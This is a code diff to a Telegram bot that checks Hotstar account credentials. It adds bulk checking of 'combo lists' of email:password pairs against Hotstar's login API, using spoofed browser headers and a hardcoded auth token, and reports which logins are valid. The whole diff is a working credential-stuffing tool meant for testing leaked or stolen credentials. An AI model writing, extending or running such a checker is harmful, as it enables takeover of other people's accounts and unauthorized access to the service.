@@ -45,9 +45,41 @@ async def checker(bot: HotstarChecker, message: Message):
     try:
         fun = "."
         for l in range(5): # hehe fun, to look cool
-            await omk.edit(f"<b>{message.text}</b>\n\n<i>Checking{fun}</i>")
-            await asyncio.sleep(0.2)
+            await omk.edit(f"<i>Checking{fun}</i>")
+            await asyncio.sleep(0.1)
             fun = fun+"."
+        if len(message.text.split(None, 1)) > 1:    
+            combo_list = list(
+                {combo.strip() for combo in message.text.split("\n") if combo.strip()}
+            )
+            for account in combo_list:
+                try:
+                    final = "Accounts checked result:\n"
+                    email, password = account.split(":")
+                    url = 'https://api.hotstar.com/in/aadhar/v2/web/in/user/login'
+                    payload = {"isProfileRequired":"false","userData":{"deviceId":"a7d1bc04-f55e-4b16-80e8-d8fbf4c91768","password":password,"username":email,"usertype":"email"}}
+                    headers = {
+                        'content-type': 'application/json',
+                        'Referer': 'https://www.hotstar.com/',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
+                        'Accept': '*/*',
+                        'hotstarauth': 'st=1542433344~exp=1542439344~acl=/*~hmac=7dd9deaf6fb16859bd90b1cc84b0d39e0c07b6bb2e174ffecd9cb070a25d9418',
+                        'Accept-Language': 'en-US,en;q=0.5',
+                        'Accept-Encoding': 'gzip, deflate',
+                        'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop'
+                        }
+                    r = requests.post(url, data=json.dumps(payload), headers=headers)
+                    if r.status_code==200:
+                        final += f"\n- **{account}**: Valid ✅"                           
+                    else:
+                        final += f"\n- **{account}**: Invalid ❌"   
+                except:
+                    final += f"\n- **{account}**: Invalid Format ❌"
+                    
+            final  += f"\n\n**Checked by {message.from_user.mention}**\nWith <3 By @GodDrick"        
+            await omk.edit(final)
+            return
+        
         msg = message.text
         email, password = msg.split(":")
         url = 'https://api.hotstar.com/in/aadhar/v2/web/in/user/login'
@@ -62,15 +94,14 @@ async def checker(bot: HotstarChecker, message: Message):
             'Accept-Encoding': 'gzip, deflate',
             'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop'
             }
-        await message.reply(email+":"+password)
         r = requests.post(url, data=json.dumps(payload), headers=headers)
         if (r.status_code==200):
             await omk.edit(
-                f"<b>The Hotstar Account is Valid✅\n\n{message.text}</b>\n\nLogin Successful!\n\n<b>Checked By: {message.from_user.mention}</b>\nWith love by @GodDrick <3",
+                f"<u><b>The Hotstar Account is Valid✅</b></u>\n\n**Email:** `{email}`\n**Pass:** `{password}`<b>Checked By: {message.from_user.mention}</b>\nWith love by @GodDrick <3",
             )
         else:
             await omk.edit(
-                f"<b>The Hotstar Account is Invalid❌</b>\n\n{message.text}\n\nLogin Unsuccessful :(\n\n<b>Checked By: {message.from_user.mention}</b>\nWith love by @GodDrick <3",
+                f"<u><b>The Hotstar Account is Invalid❌</b></u>\n\n**Email:** `{email}`\n**Pass:** `{password}`\n\n<b>Checked By: {message.from_user.mention}</b>\nWith love by @GodDrick <3",
             )
     except:
         await omk.edit("Something Went Wrong! Make sure you have put account in correct order, i.e, email:pass... retry again!")
@@ -93,7 +124,10 @@ async def start(_, message: Message):
     
 @HotstarChecker.on_message(filters.command("help"))
 async def help(_, message: Message):      
-    await message.reply("Just send me the email and password in the format email:pass and I will check it for you, thats it!")    
+    await message.reply("Just send me the email and password in the format email:pass and I will check it for you, thats it!"
+                        " If you want to check multiple accounts, use this format:\n`email1:pass1\nemail2:pass2\nemail3:pass3\nThat's it!`"
+                        " \n\n--Combolist file support soon!-- :)",
+                       )    
     
 
 if __name__ == "__main__":
